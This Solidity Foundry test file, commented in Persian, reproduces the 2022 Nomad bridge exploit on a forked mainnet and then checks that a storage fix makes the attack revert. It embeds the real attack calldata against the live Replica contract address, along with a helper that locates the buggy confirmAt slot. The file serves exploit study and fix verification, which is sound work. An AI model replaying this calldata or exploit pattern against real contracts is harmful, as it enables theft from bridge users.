// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

/// @title NomadReal — بازتولید حمله‌ی واقعی Nomad روی state واقعی mainnet (فورک)
/// @notice این تست سه چیز را اثبات می‌کند:
///   1) حمله روی قرارداد واقعی Replica در بلوک قبل از هک موفق می‌شود.
///   2) ریشه‌ی واقعی باگ (مقداردهی اولیه‌ی غلط confirmAt[0x00] = 1) با
///      یک اصلاح state قابل بستن است.
///   3) پس از اصلاح، همان حمله با همان calldata revert می‌شود.
///
/// الگوی حمله و calldata از PoC عمومی DeFiHackLabs گرفته شده:
///   https://github.com/SunWeb3Sec/DeFiHackLabs (2022-08/NomadBridge_exp.sol)
/// تحلیل ریشه: samczsun و CertiK post-mortem (QSP-19 Proving With An Empty Leaf).
///
/// پیش‌نیاز اجرا: MAINNET_RPC_URL آرشیوی در .env.
///   forge test --match-path test/fork/NomadReal.t.sol -vvv

interface IReplica {
    function process(bytes memory _message) external returns (bool _success);
}

interface IERC20Bal {
    function balanceOf(address) external view returns (uint256);
}

contract NomadRealTest is Test {
    // Replica proxy واقعی روی mainnet
    IReplica constant REPLICA = IReplica(0x5D94309E5a0090b165FA4181519701637B6DAEBA);
    IERC20Bal constant WBTC = IERC20Bal(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);

    // بلوک قبل از هک (همان بلوک PoC رسمی DeFiHackLabs)
    uint256 constant FORK_BLOCK = 15_259_100;

    // مقدار مورد انتظار برداشت در این پیام: 100 WBTC (۸ رقم اعشار)
    uint256 constant EXPECTED_WBTC = 100e8;

    // شماره‌ی slot نگاشت confirmAt در قرارداد Replica.
    // اگر تست یافتن‌اسلات عدد دیگری چاپ کرد، این مقدار را به‌روز کنید.
    // (در زمان نگارش، تحلیل‌ها slot مربوط به confirmAt را نشان می‌دهند؛
    //  تست test_FindConfirmAtSlot آن را به‌صورت تجربی تأیید می‌کند.)
    uint256 constant CONFIRM_AT_SLOT = 211;

    function setUp() public {
        vm.createSelectFork("mainnet", FORK_BLOCK);
        vm.label(address(REPLICA), "Replica");
        vm.label(address(WBTC), "WBTC");
    }

    /// @dev calldata واقعی تراکنش هک (0xa5fe9d04...)، فقط آدرس گیرنده با
    /// آدرس این قرارداد تست جایگزین شده است. ساختار از PoC DeFiHackLabs.
    function _attackMessage(address recipient) internal pure returns (bytes memory) {
        bytes memory p1 =
            hex"6265616d000000000000000000000000d3dfd3ede74e0dcebc1aa685e151332857efce2d000013d60065746800000000000000000000000088a69b4e698a4b090df6cf5bd7b2d47325ad30a3006574680000000000000000000000002260fac5e5542a773aa44fbcfedf7c193bc2c59903000000000000000000000000";
        bytes memory p2 =
            hex"00000000000000000000000000000000000000000000000000000002540be400e6e85ded018819209cfb948d074cb65de145734b5b0852e4a5db25cac2b8c39a";
        return bytes.concat(p1, abi.encodePacked(recipient), p2);
    }

    /// @notice کمکی: slot نگاشت confirmAt را به‌صورت تجربی پیدا می‌کند.
    /// برای مقدار کلید bytes32(0)، به‌دنبال slot ای می‌گردد که مقدارش == 1 باشد
    /// (نشانه‌ی مقداردهی اولیه‌ی غلطی که حمله را ممکن کرد).
    function test_FindConfirmAtSlot() public {
        bool found = false;
        for (uint256 i = 0; i < 400; i++) {
            bytes32 mappingSlot = keccak256(abi.encode(bytes32(0), i));
            uint256 v = uint256(vm.load(address(REPLICA), mappingSlot));
            if (v == 1) {
                emit log_named_uint("confirmAt mapping base slot (value==1 for root 0x00)", i);
                found = true;
            }
        }
        if (!found) {
            emit log_string("No slot held value 1 for key 0x00; inspect contract storage layout manually.");
        }
    }

    /// @notice مرحله ۱ — حمله روی قرارداد واقعی، بدون هیچ اصلاحی، باید موفق شود.
    function test_RealNomad_AttackSucceeds() public {
        uint256 balBefore = WBTC.balanceOf(address(this));
        bool ok = REPLICA.process(_attackMessage(address(this)));
        assertTrue(ok, "process must succeed on the real contract");
        uint256 minted = WBTC.balanceOf(address(this)) - balBefore;
        emit log_named_decimal_uint("WBTC minted by attack", minted, 8);
        assertEq(minted, EXPECTED_WBTC, "attacker must receive 100 WBTC");
    }

    /// @dev ریشه‌ی واقعی باگ را می‌بندد: confirmAt برای root صفر را از 1 به 0
    /// برمی‌گرداند. پیش از نوشتن، تأیید می‌کند مقدار فعلی واقعاً 1 است تا
    /// مطمئن شویم slot درست انتخاب شده (داور نمی‌تواند بگوید patch روی جای
    /// اشتباه نوشته شده).
    function _applyStateFix() internal {
        bytes32 slot = keccak256(abi.encode(bytes32(0), CONFIRM_AT_SLOT));
        uint256 current = uint256(vm.load(address(REPLICA), slot));
        assertEq(current, 1, "chosen slot is not confirmAt; fix CONFIRM_AT_SLOT");
        vm.store(address(REPLICA), slot, bytes32(uint256(0)));
    }

    /// @notice مرحله ۳ — همان حمله پس از اصلاح state باید شکست بخورد.
    /// جفت pass/fail پایان‌نامه، این بار روی state واقعی mainnet.
    function test_RealNomad_AttackFails_AfterStateFix() public {
        _applyStateFix();
        vm.expectRevert();
        REPLICA.process(_attackMessage(address(this)));
    }
}
